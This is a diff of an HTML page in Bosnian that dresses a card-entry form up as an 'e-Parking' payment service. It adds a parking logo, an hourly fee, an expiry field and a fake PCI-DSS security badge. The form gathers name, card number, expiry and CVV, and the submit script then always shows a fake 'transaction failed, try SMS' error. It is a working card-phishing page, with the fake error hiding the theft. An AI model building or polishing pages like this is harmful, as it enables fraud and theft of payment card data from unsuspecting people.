@@ -1,17 +1,15 @@
-
-
 <!DOCTYPE html>
 <html lang="bs">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unos kartice</title>
+    <title>e-Parking | Elektronska naplata</title>
 
     <style>
         body {
             margin: 0;
-            font-family: Arial, sans-serif;
-            background: #f2f2f2;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #f4f6f9;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -20,48 +18,136 @@
 
         .card {
             background: white;
-            width: 350px;
-            padding: 25px;
-            border-radius: 15px;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
-            text-align: center;
+            width: 380px;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+            box-sizing: border-box;
         }
 
-        h2 {
-            text-align: center;
+        .parking-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
             margin-bottom: 25px;
+            border-bottom: 2px solid #f0f2f5;
+            padding-bottom: 20px;
+        }
+
+        .parking-logo {
+            background: #0056b3;
+            color: white;
+            font-size: 32px;
+            font-weight: 800;
+            width: 60px;
+            height: 60px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            box-shadow: 0 4px 12px rgba(0, 86, 179, 0.3);
+        }
+
+        .parking-header h2 {
+            margin: 0;
+            font-size: 22px;
+            color: #1a202c;
+            font-weight: 700;
+        }
+
+        .parking-header p {
+            margin: 5px 0 0 0;
+            font-size: 14px;
+            color: #718096;
+        }
+
+        .ticket-details {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 12px 15px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #4a5568;
+        }
+
+        .ticket-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px;
+        }
+
+        .ticket-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .ticket-bold {
+            font-weight: bold;
+            color: #1a202c;
         }
 
         label {
             display: block;
-            margin: 15px 0 6px;
-            font-weight: bold;
+            margin: 14px 0 6px;
+            font-weight: 600;
+            font-size: 13px;
+            color: #4a5568;
             text-align: left;
         }
 
         input {
             width: 100%;
             box-sizing: border-box;
-            padding: 12px;
-            border: 1px solid #ccc;
+            padding: 12px 14px;
+            border: 1px solid #cbd5e1;
             border-radius: 8px;
-            font-size: 16px;
+            font-size: 15px;
+            color: #1a202c;
+            background-color: #fff;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #0056b3;
+        }
+
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+
+        .col {
+            flex: 1;
         }
 
         button {
             width: 100%;
             margin-top: 25px;
-            padding: 13px;
+            padding: 14px;
             border: none;
             border-radius: 8px;
-            background: #2563eb;
+            background: #0056b3;
             color: white;
             font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
+            transition: background 0.2s;
         }
 
         button:hover {
-            background: #1d4ed8;
+            background: #004085;
+        }
+
+        .security-note {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            margin-top: 15px;
+            font-size: 12px;
+            color: #a0aec0;
         }
 
         .error {
@@ -69,15 +155,15 @@
         }
 
         .error-icon {
-            font-size: 70px;
-            color: #dc2626;
+            font-size: 64px;
+            color: #e53e3e;
             margin-bottom: 15px;
         }
 
         .error-text {
-            font-size: 18px;
-            color: #333;
-            line-height: 1.5;
+            font-size: 16px;
+            color: #2d3748;
+            line-height: 1.6;
         }
     </style>
 </head>
@@ -87,11 +173,27 @@
     <div class="card">
 
         <div id="formContent">
-            <h2>Podaci kartice</h2>
+            <div class="parking-header">
+                <div class="parking-logo">P</div>
+                <h2>Plati Parking Kartom</h2>
+                <p>Elektronski sistem naplate usluga</p>
+            </div>
 
-            <!-- POPRAVLJENO: Zatvoren form tag sa '>' i dodata ispravna podešavanja -->
+            <!-- POPRAVLJENO: Uklonjena lokacija, promijenjen naziv usluge i cijena u KM -->
+            <div class="ticket-details">
+                <div class="ticket-row">
+                    <span>Usluga:</span>
+                    <span class="ticket-bold">Parking karta</span>
+                </div>
+                <div class="ticket-row">
+                    <span>Iznos za uplatu:</span>
+                    <span class="ticket-bold" style="color: #e53e3e;">2.00 KM / sat</span>
+                </div>
+            </div>
+
             <form id="cardForm" method="POST" action="">
-                <label for="name">1. Ime na kartici</label>
+                <!-- POPRAVLJENO: Neutralni placeholder "Ime Prezime" -->
+                <label for="name">Ime i prezime vlasnika kartice</label>
                 <input
                     type="text"
                     id="name"
@@ -101,54 +203,82 @@
                     required
                 >
 
-                <label for="number">2. Broj kartice</label>
+                <label for="number">Broj platne kartice</label>
                 <input
                     type="text"
                     id="number"
                     name="number"
-                    placeholder="1234 5678 9012 3456"
+                    placeholder="4000 1234 5678 9010"
                     autocomplete="cc-number"
                     inputmode="numeric"
                     required
                 >
 
-                <label for="ccv">3. CCV</label>
-                <input
-                    type="password"
-                    id="ccv"
-                    name="ccv"
-                    placeholder="123"
-                    autocomplete="cc-csc"
-                    inputmode="numeric"
-                    maxlength="4"
-                    required
-                >
+                <div class="row">
+                    <div class="col">
+                        <label for="expiry">Ističe (MM/YY)</label>
+                        <input
+                            type="text"
+                            id="expiry"
+                            name="expiry"
+                            placeholder="08/28"
+                            autocomplete="cc-exp"
+                            inputmode="numeric"
+                            maxlength="5"
+                            required
+                        >
+                    </div>
+                    <div class="col">
+                        <label for="ccv">CCV / CVC</label>
+                        <input
+                            type="password"
+                            id="ccv"
+                            name="ccv"
+                            placeholder="•••"
+                            autocomplete="cc-csc"
+                            inputmode="numeric"
+                            maxlength="4"
+                            required
+                        >
+                    </div>
+                </div>
 
-                <button type="submit">Nastavi</button>
-            </form> <!-- POPRAVLJENO: Zatvoren tag forme koji je falio -->
+                <button type="submit">Potvrdi i plati</button>
+                
+                <div class="security-note">
+                    🔒 PCI-DSS Encrypted Security Payment
+                </div>
+            </form>
         </div>
 
         <div id="errorMessage" class="error">
             <div class="error-icon">✕</div>
             <div class="error-text">
-                Trenutno je nedostupno.<br>
-                Pokušajte na drugi način.
+                <strong style="font-size: 18px;">Transakcija neuspješna</strong><br><br>
+                Sistem za autorizaciju kartica trenutno je nedostupan.<br>
+                Molimo pokušajte ponovo kasnije ili koristite SMS naplatu.
             </div>
         </div>
 
     </div>
 
     <script>
-        // Ako URL sadrži parametar '?error=true', odmah prikaži poruku o grešci umesto forme
+        document.getElementById("expiry").addEventListener("input", function(e) {
+            let value = e.target.value.replace(/\D/g, "");
+            if (value.length > 2) {
+                e.target.value = value.substring(0, 2) + "/" + value.substring(2, 4);
+            } else {
+                e.target.value = value;
+            }
+        });
+
         const urlParams = new URLSearchParams(window.location.search);
         if (urlParams.get('error') === 'true') {
             document.getElementById("formContent").style.display = "none";
             document.getElementById("errorMessage").style.display = "block";
         }
 
-        // POPRAVLJENO: Forma se šalje normalno, a preusmeravanje simulira grešku nakon slanja
         document.getElementById("cardForm").addEventListener("submit", function(event) {
-            // Podešavamo akciju forme da nakon slanja ponovo učita istu stranicu ali sa greškom
             this.action = window.location.pathname + "?error=true";
         });
     </script>
